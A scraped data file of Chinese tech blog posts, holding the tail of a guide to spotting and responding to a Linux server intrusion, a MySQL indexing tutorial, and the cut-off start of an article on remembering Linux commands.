data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstrace -p PID\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1533796808760-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b1533796808760-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b1533796808760-1\"><span class=\"crayon-v\">strace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">PID</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b1533796808760-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这会显示出该进程调用的所有系统调用。它产生的内容会很多，但这些信息能告诉你这个进程在做什么。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b1539324264824\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlsof  -p PID\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1539324264824-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b1539324264824-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b1539324264824-1\"><span class=\"crayon-v\">lsof</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">PID</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b1539324264824-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这个程序会列出该进程打开的文件。通过查看它访问的文件可以很好的理解它在做的事情。</p>\n<h4 id=\"toc_6\">检查 5 – 检查所有的系统进程</h4>\n<p>消耗 CPU 不严重的未授权进程可能不会在 <code>top</code> 中显露出来，不过它依然可以通过 <code>ps</code> 列出来。命令 <code>ps auxf</code> 就能显示足够清晰的信息了。</p>\n<p>你需要检查一下每个不认识的进程。经常运行 <code>ps</code> （这是个好习惯）能帮助你发现奇怪的进程。</p>\n<h4 id=\"toc_7\">检查 6 – 检查进程的网络使用情况</h4>\n<p><code>iftop</code> 的功能类似 <code>top</code>，它会排列显示收发网络数据的进程以及它们的源地址和目的地址。类似 DoS 攻击或垃圾机器人这样的进程很容易显示在列表的最顶端。</p>\n<h4 id=\"toc_8\">检查 7 – 哪些进程在监听网络连接?</h4>\n<p>通常攻击者会安装一个后门程序专门监听网络端口接受指令。该进程等待期间是不会消耗 CPU 和带宽的，因此也就不容易通过 <code>top</code> 之类的命令发现。</p>\n<p><code>lsof</code> 和 <code>netstat</code> 命令都会列出所有的联网进程。我通常会让它们带上下面这些参数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b153d243726354\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlsof -i\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b153d243726354-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b153d243726354-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b153d243726354-1\"><span class=\"crayon-v\">lsof</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b153d243726354-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b1540720230085\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnetstat -plunt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1540720230085-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b1540720230085-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b1540720230085-1\"><span class=\"crayon-v\">netstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">plunt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b1540720230085-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>你需要留意那些处于 <code>LISTEN</code> 和 <code>ESTABLISHED</code> 状态的进程，这些进程要么正在等待连接（LISTEN），要么已经连接（ESTABLISHED）。如果遇到不认识的进程，使用 <code>strace</code> 和 <code>lsof</code> 来看看它们在做什么东西。</p>\n<h3 id=\"toc_9\">被入侵之后该怎么办呢?</h3>\n<p>首先，不要紧张，尤其当攻击者正处于登录状态时更不能紧张。<strong>你需要在攻击者警觉到你已经发现他之前夺回机器的控制权。</strong>如果他发现你已经发觉到他了，那么他可能会锁死你不让你登陆服务器，然后开始毁尸灭迹。</p>\n<p>如果你技术不太好那么就直接关机吧。你可以在服务器上运行 <code>shutdown -h now</code> 或者 <code>systemctl poweroff</code> 这两条命令之一。也可以登录主机提供商的控制面板中关闭服务器。关机后，你就可以开始配置防火墙或者咨询一下供应商的意见。</p>\n<p>如果你对自己颇有自信，而你的主机提供商也有提供上游防火墙，那么你只需要以此创建并启用下面两条规则就行了：</p>\n<ol>\n<li>只允许从你的 IP 地址登录 SSH。</li>\n<li>封禁除此之外的任何东西，不仅仅是 SSH，还包括任何端口上的任何协议。</li>\n</ol>\n<p>这样会立即关闭攻击者的 SSH 会话，而只留下你可以访问服务器。</p>\n<p>如果你无法访问上游防火墙，那么你就需要在服务器本身创建并启用这些防火墙策略，然后在防火墙规则起效后使用 <code>kill</code> 命令关闭攻击者的 SSH 会话。（LCTT 译注：本地防火墙规则 有可能不会阻止已经建立的 SSH 会话，所以保险起见，你需要手工杀死该会话。）</p>\n<p>最后还有一种方法，如果支持的话，就是通过诸如串行控制台之类的带外连接登录服务器，然后通过 <code>systemctl stop network.service</code> 停止网络功能。这会关闭所有服务器上的网络连接，这样你就可以慢慢的配置那些防火墙规则了。</p>\n<p>重夺服务器的控制权后，也不要以为就万事大吉了。</p>\n<p>不要试着修复这台服务器，然后接着用。你永远不知道攻击者做过什么，因此你也永远无法保证这台服务器还是安全的。</p>\n<p>最好的方法就是拷贝出所有的数据，然后重装系统。（LCTT 译注：你的程序这时已经不可信了，但是数据一般来说没问题。）</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113205\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113205votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113205\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 11 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/0d4192df99abd0f294a9eade3688a9b7ce6caa0e.jpg"}
{"url_object_id": "986ccf2aa5053a80703a2f892c18fcab", "title": "写会 MySQL 索引", "url": "http://blog.jobbole.com/113142/", "create_date": "2017/11/29", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 3, "tags": "IT技术,MySQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/u/1462914/blog/1563127\">andyqian</a>   </div><h4>前言</h4>\n<p>继上篇《读懂MySQL执行计划》后，在文章末尾，我们谈到了索引的概念，那么，今天我们就一起来聊一聊MySQL索引。</p>\n<p> </p>\n<h4>什么是索引？</h4>\n<p>百度百科是这样描述的：</p>\n<blockquote><p>索引是为来加速对表中数据行中的检索而创建的一种分散的数据结果，时针对表而建立的，它是由数据页面以外的索引页面组成，每个索引页中的行都含有逻辑指针，以便加速检索物理数据</p></blockquote>\n<p>其实，索引的概念大家都很清楚，也知道索引能够提升查询效率，但大部分童鞋在怎么建索引，建在哪些字段上有以下常见误解:</p>\n<ul>\n<li>新建表时不需要建索引，后续才添加索引</li>\n<li>where条件后的字段均建索引</li>\n<li>简单SQL不需要索引，联合查询才需要索引</li>\n<li>联合索引的顺序是where条件后字段的先后顺序</li>\n<li>对于区分度小的字段上也新建索引,如状态,性别等字段等。</li>\n</ul>\n<p> </p>\n<h4>索引区分度</h4>\n<p>在说上述问题之前，我们先来看看另一个概念，就是区分度。</p>\n<blockquote><p>区分度: 指字段在数据库中的不重复比</p></blockquote>\n<p>区分度在新建索引时有着非常重要的参考价值，在MySQL中，区分度的计算规则如下:</p>\n<blockquote><p>字段去重后的总数与全表总记录数的商。</p></blockquote>\n<p>例如:</p>\n<blockquote><p>select count(distinct(name))/count(*) from t_base_user;</p></blockquote>\n<p>结果如下:</p>\n<table>\n<tbody>\n<tr>\n<th>count(distinct(name))/count(*)</th>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>1.0000</td>\n</tr>\n</tbody>\n</table>\n<p>其中区分度最大值为1.000，最小为0.0000，区分度的值越大，也就是数据不重复率越大，新建索引效果也越好，在主键以及唯一键上面的区分度是最高的，为1.0000，在状态、性别等字段上面的区分度值是最小的。 (这个就要看数据量了，如果只有几条数据，这时区分度还挺高的，如果数据量多，区分度基本为0.0000。也就是在这些字段上添加索引后，效果也不佳的原因。)</p>\n<p>值得注意的是：如果表中没有任何记录时，计算区分度的结果是为空值，其他情况下，区分度值均分布在0.0000-1.0000之间。</p>\n<p> </p>\n<h4>如何建索引</h4>\n<p><strong>   (一)  : 区分度</strong><br>\n个人强烈建议，建索引时，一定要先计算该字段的区分度，原因如下:</p>\n<p><strong>1. 单列索引</strong><br>\n可以查看该字段的区分度，根据区分度的大小，也能大概知道在该字段上的新建索引是否有效，以及效果如何。区分度越大，索引效果越明显。</p>\n<p><strong>2.多列索引(联合索引)</strong><br>\n多列索引中其实还有一个字段的先后顺序问题，一般是将区分度较高的放在前面，这样联合索引才更有效，例如:</p>\n<blockquote><p>select * from t_base_user where name=”” and status=1;</p></blockquote>\n<p>像上述语句，如果建联合索引的话，就应该是:</p>\n<blockquote><p>alter table t_base_user add index idx_name_status(name,status);</p></blockquote>\n<p>而不是:</p>\n<blockquote><p>alter table t_base_user add index idx_status_name(status,name)；</p></blockquote>\n<p><strong>(二) 最左前缀匹配原则</strong><br>\nMySQL会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配，比如</p>\n<blockquote><p>select * from t_base_user where type=”10″ and created_at&lt;“2017-11-03” and status=1, (该语句仅作为演示)</p></blockquote>\n<p>在上述语句中，status就不会走索引，因为遇到&lt;时，MySQL已经停止匹配，此时走的索引为：(type,created_at)，其先后顺序是可以调整的，而走不到status索引，此时需要修改语句为:</p>\n<blockquote><p>select * from t_base_user where type=10 and status=1 and created_at&lt;“2017-11-03”</p></blockquote>\n<p>即可走status索引。</p>\n<p><strong>(三) 函数运算</strong><br>\n不要在索引列上，进行函数运算，否则索引会失效。因为b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较，显然成本太大。</p>\n<p><strong>(四) 扩展优先</strong><br>\n扩展优先，不要新建索引，尽量在已有索引中修改。如下:</p>\n<blockquote><p>select * from t_base_user where name=”andyqian” and email=”andytohome”</p></blockquote>\n<p>在表t_base_user表中已经存在idx_name索引，如果需要加入idx_name_email的索引，应该是修改idx_name索引，而不是新建一个索引。</p>\n<p> </p>\n<h4>误解纠正</h4>\n<p>上面说了，如何新建索引，现在我们就可以来回答，在第一步中存在的误解了。</p>\n<p><strong>误解一: 新建表时不需要建立索引,后续才加索引</strong></p>\n<p>答: 一个好的数据表设计，在一开始就要考虑索引的创建，而不是等到后续出问题了，影响业务使用了，才新建索引来救场，而且后续创建索引的成本也相对高很多。(这就是给生产事故留下生根发芽的机会呀)</p>\n<p><strong>误解二: where条件后的字段均建索引</strong></p>\n<p>答: 这个误解比较常见，但where条件后的字段不需要全部建立索引，过多的索引，也会导致索引文件剧增，也还达不到期望中的效果。详细请参考上述新建索引的小节。</p>\n<p><strong>误解三: 简单SQL不需要建立索引,联合查询采建立索引</strong></p>\n<p>答: 这个误解就得好好说说了，现在互联网公司特别是B/S架构下，业务逻辑均剥离在代码逻辑层，到最后SQL层面，其实都是一些简单的SQL，只有些许连接查询，更多的还是单表操作，(C/S架构中有很多在SQL层面的写逻辑的)，你说这些语句简不简单。</p>\n<p><strong>误解四: 联合索引的顺序是where条件后字段的先后顺序</strong></p>\n<p>答: 我们刚才说过，联合索引的顺序，是根据最左前缀原则，以及区分度来区分的，和where条件后字段的先后顺序无关。</p>\n<p><strong>误解五： 对于区分度较小的字段新建索引</strong></p>\n<p>答: 在区分度较小的字段上新建索引，基本无效，还会增加大量的索引文件，你说是不是得不偿失。</p>\n<p> </p>\n<h4>索引重不重要？</h4>\n<p>上面介绍了MySQL索引的概念，新建索引时的一些技巧。这么理论的东西，对于平时没有使用或使用比较少的童鞋，此时对索引的重要性可能还没那么直观，那么，我就来说说我在索引上吃过的亏，踩过的坑！同时也是未建索引常见问题！</p>\n<p><strong>0. 导致慢查询</strong><br>\n这个问题可是未建索引的常客哦，（这里也还有很多细节呢，如: 隐式类型转换等等）</p>\n<p><strong>1. 导致服务超时</strong></p>\n<p><strong>场景 :</strong><br>\n在某次上线时，作为服务提供者，提供服务给业务方使用。一开始以为就提供一个简单的服务，也已经测试完成，心里还在窃喜，今天总算可以早早回家了！<br>\n<strong>描述 :</strong><br>\n实际一上线，在生产环境中导致业务方请求调用时，而且每次请求均超时，数据也已落地，此时只能review代码，最后发现生产中有个慢查询导致，活活的花费了10多秒，这个语句有多简单呢，你绝对想不到，就是一个简单的单表where查询。</p>\n<p>你说这种原因导致服务不可用，你说冤不冤，气不气！（这也是我为什么说，一个好的数据表设计，从一开始就要考虑新建索引了）。</p>\n<p><strong>2. 数据库服务器CPU 100%</strong></p>\n<p>在查询频率比较高的SQL上，如果出现未建索引，导致慢查询的话，那可是会导致数据库服务器CPU 100%，影响可是整个系统哦。</p>\n<p><strong>小结</strong><br>\n上面说了好几类，由于没建立索引而导致的问题，轻则导致慢查询，影响系统效率，重则，导致CPU 100%，影响整个系统的使用，看到这里，你说索引重不重要？</p>\n<p> </p>\n<h4>最后</h4>\n<p>上面简单说了，索引是什么、有什么用，以及建立索引时的一些技巧，还着重说了索引的重要性。那么索引这么重要，在平时编码时如何规避问题呢？以下是我个人的建议:</p>\n<ol>\n<li>在建表时就应该考虑添加索引，如: 外键字段等等。</li>\n<li>在写完SQL后，一定要查看执行计划。尽量避免全表扫描。</li>\n<li>如果是已有表中添加索引，一定要先计算该字段的区分度。</li>\n<li>联合索引，将区分度大放在前面。</li>\n<li>遵从MySQL左列前缀优先原则</li>\n</ol>\n<p> </p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113142\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113142votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113142\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"}
{"url_object_id": "7977373aa7cda30ddbb6f13b26014e73", "title": "如何轻松记住 Linux 命令", "url": "http://blog.jobbole.com/113158/", "create_date": "2017/11/30", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "praise_nums": 2, "comment_nums": 1, "favor_nums": 3, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.maketecheasier.com/remember-linux-commands/\"> Nick Congleton</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9093-1.html\">Linux中国/DarkSun</a>   </div><p>Linux 新手往往对命令行心存畏惧。部分原因是因为需要记忆大量的命令，毕竟掌握命令是高效使用命令行的前提。</p>\n<p>不幸的是，学习这些命令并无捷径，然而在你开始学习命令之初，有些工具还是可以帮到你的。</p>\n<h3 id=\"toc_1\">history</h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/b9f1e0ab22ccd690e6064704ebc0333a.jpg\" alt=\"Linux Bash History 命令\"></p>\n<p>首先要介绍的是命令行工具 <code>history</code>，它能帮你记住那些你曾经用过的命令。包括应用最广泛的 Bash 在内的大多数 <a href=\"https://www.maketecheasier.com/alternative-linux-shells/\">Linux shell</a>，都会创建一个历史文件来包含那些你输入过的命令。如果你用的是 Bash，这个历史文件就是 <code>/home/&lt;username&gt;/.bash_history</code>。</p>\n<p>这个历史文件是纯文本格式的，你可以用任意的文本编辑器打开来浏览和搜索。</p>\n<h3 id=\"toc_2\">apropos</h3>\n<p>确实存在一个可以帮你找到其他命令的命令。这个命令就是 <code>apropos</code>，它能帮你找出合适的命令来完成你的搜索。比如，假设你需要知道哪个命令可以列出目录的内容，你可以运行下面命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ef08d28d356744872\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\napropos \"list directory\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ef08d28d356744872-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ef08d28d356744872-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ef08d28d356744872-1\"><span class=\"crayon-i\">apropos</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"list directory\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ef08d28d356744872-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/5b2776fdc0581fc6c87486cb46f7a289.jpg\" 